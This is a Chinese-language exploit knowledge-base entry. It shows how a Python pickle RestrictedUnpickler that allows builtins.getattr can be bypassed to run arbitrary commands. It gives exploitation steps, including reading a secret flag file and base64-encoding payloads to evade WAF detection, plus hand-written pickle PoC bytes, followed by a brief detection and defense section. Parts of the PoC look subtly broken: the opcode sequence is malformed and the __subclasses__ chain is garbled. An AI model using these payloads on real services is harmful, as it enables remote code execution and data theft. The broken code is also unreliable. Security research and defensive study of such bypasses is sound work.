---
id: web-python-deserialization-restricted-unpickler-getattr-bypass
title: RestrictedUnpickler 放行 builtins.getattr：动态取属性绕过 find_class 允许列表并执行命令
type: scenario
domain: web
path: web/python/deserialization
technique: restricted-unpickler-getattr-bypass
aliases:
- pickle getattr 绕过 find_class
- RestrictedUnpickler 绕过
- builtins.getattr RCE
- STACK_GLOBAL 手写 opcode
- pickle 允许列表绕过
- __dict__ __getitem__ __import__
tags:
- python
- pickle
- deserialization
- restricted-unpickler
- find-class
- allowlist-bypass
- getattr
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:12+08:00'
  notes: 对照小宝：RestrictedUnpickler 放行 builtins.getattr、getattr 链与 STACK_GLOBAL 细节一致；未复跑
---

## 一句话结论

当反序列化端用 `RestrictedUnpickler.find_class` 做允许列表、却放行了 `builtins.getattr` 时，攻击者可以在反序列化过程中用它动态取到 `builtins.__import__`、`eval` 或目标环境里的 `subprocess.Popen` 等未被允许的对象；允许列表因此被完全绕过，最终执行任意命令。

## 原理

- pickle 的 `GLOBAL`/`STACK_GLOBAL` opcode 会按“模块名 + 属性名”调用 `find_class(module, name)`，允许列表通常在这里拦截 `os.system`、`subprocess.Popen`、`builtins.eval` 等危险对象。
- `builtins.getattr` 本身是一个普通函数，看起来“无害”，常被允许列表放行。但它能对任意对象取任意属性：`getattr(obj, name)` 的 `name` 也来自 pickle 栈，等价于把属性访问变成运行时可控操作。
- 只要允许列表里有 `getattr`，就能从任意可达对象出发走到危险 sink：
  - `getattr(builtins.print, '__self__')` 返回 `builtins` 模块；
  - `builtins.__dict__['__getitem__']('__import__')`（等价于 `getattr(builtins.__dict__, '__getitem__')('__import__')`）取出 `builtins.__import__`；
  - 调用 `__import__('os')` 得到 `os` 模块，再 `getattr(os, 'system')(cmd)` 执行命令。
- 也可以用 `getattr(builtins, 'eval')` 动态取出被允许列表禁止的 `eval`，再以代码字符串完成任意逻辑；若目标环境允许，`().**class**.base.subclasses()` 还能枚举到 `subprocess.Popen` 等类，索引随 Python 版本/环境变化，需要先泄露或枚举。
- 一个实现细节：部分 Python 版本的 `pickle.dumps` 会把 `builtins` 模块记成 `builtin`，目标端解析失败；手工构造 opcode 时用 `STACK_GLOBAL`（`\x93`）显式压入模块名 `builtins` 和属性名，可避免该差异。

## 触发条件

- 接口对攻击者可控数据调用 `pickle.loads`/`Unpickler.load`。
- 使用 `find_class` 允许列表，且列表包含 `builtins.getattr`（或整个 `builtins` 模块、`operator.attrgetter`、`getattr` 的同类封装）。
- 反序列化在没有强沙箱的进程内进行（能触达 `os`/`subprocess`/文件系统），且进程权限足以读取目标文件或执行命令。
- 请求体可控且能以 base64 等形式传入 pickle 字节。

## 利用步骤

1. 确认接口接收 base64 pickle，并探测允许列表：提交只含 `builtins.getattr` 的惰性载荷，观察是否报 `find_class` 拒绝。
2. 构造 `getattr` 链：目标端反序列化时先 `getattr(builtins.print,'__self__')` 取回 `builtins`，再用 `__dict__['__getitem__']('__import__')` 取出导入函数，导入 `os` 后调用 `system(cmd)`。
3. 若 `builtins` 名在目标端解析异常，改用手写 `STACK_GLOBAL` opcode，显式写入 `builtins` 与 `getattr` 字符串。
4. 执行 `id`、读取 `/run/.../flag.secret` 等敏感文件；若需要更稳定的执行，枚举 `object.__subclasses__()` 找到 `subprocess.Popen`。
5. 清理/伪装载荷：base64 编码、放在正常字段中，避免 WAF 对 `os`/`system` 等子串的检测。

## PoC

```python
# 逻辑链（目标端反序列化时由 getattr 动态求值）
expr = (
    "builtins.getattr(builtins.print,'__self__')"
    ".__dict__['__getitem__']('__import__')('os').system('id')"
)
```

```python
# 用 getattr 动态取出被允许列表禁止的 eval，再执行代码
# 手写 pickle：GLOBAL builtins.getattr -> getattr(builtins,'eval') -> eval(code)
payload = (
    b"cbuiltins\ngetattr\n"          # 允许列表放行的函数
    b"(builtins\n"                   # 参数 1：builtins 模块
    b"S'eval'\n"                     # 参数 2：属性名
    b"tR"                            # getattr(builtins, 'eval') -> eval
    b"S\"__import__('os').system('id')\"\n"
    b"\x85R"                         # eval("__import__('os').system('id')")
)
import base64
print(base64.b64encode(payload).decode())
```

```python
# 服务端通常长这样：
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if (module, name) in ALLOWED:      # 若 ALLOWED 含 ('builtins','getattr')
            return super().find_class(module, name)
        raise pickle.UnpicklingError("blocked")
```

## 变体与关联

- 变体：`operator.attrgetter`、`functools.partial(getattr, ...)`、`builtins.__dict__.__getitem__` 等同类属性访问原语；`builtins.setattr` 还能改写对象状态。
- 变体：允许 `builtins` 模块本身（而非具体函数）时，`GLOBAL builtins eval` 直接可达；允许 `subprocess`、`os` 的任意子模块时同理。
- 关联：[[web-python-deserialization-pickle-codetype-function-hijack]]（关键字黑名单下的 `getattr`/`CodeType` 劫持）、[[web-python-deserialization-pickle-self-secret-signature-bypass]]（自签名 pickle）、[[web-python-deserialization-django-file-cache-pickle-rce]]（文件缓存投毒触发 unpickle）。
- 边界：允许列表若只包含白名单类且不含任何属性访问原语，则 `getattr` 链不可用；Python 版本影响 `subclasses()` 索引与 `builtins` 模块名；沙箱/`seccomp` 可能限制最终命令执行。

## 检测与防御

- 检测：审计 `find_class` 允许列表，重点排查 `getattr`、`setattr`、`eval`、`exec`、`builtins`、`operator`、`functools`；对 pickle 请求体中出现 `builtins`、`getattr`、`__dict__`、`__import__`、`STACK_GLOBAL` 等高危 opcode/字符串告警。
- 修复：不要反序列化不可信 pickle，改用 JSON/Protobuf 等数据格式；必须使用时用严格的类允许列表，只允许业务 DTO，禁止任何函数/属性访问原语与 `builtins` 模块。
- 加固：在独立低权限进程/容器中反序列化，限制文件系统与网络；使用 `pickle.Unpickler` 的 `find_class` 白名单单元测试覆盖 `getattr` 绕过；对 base64 大字段做来源与格式校验。
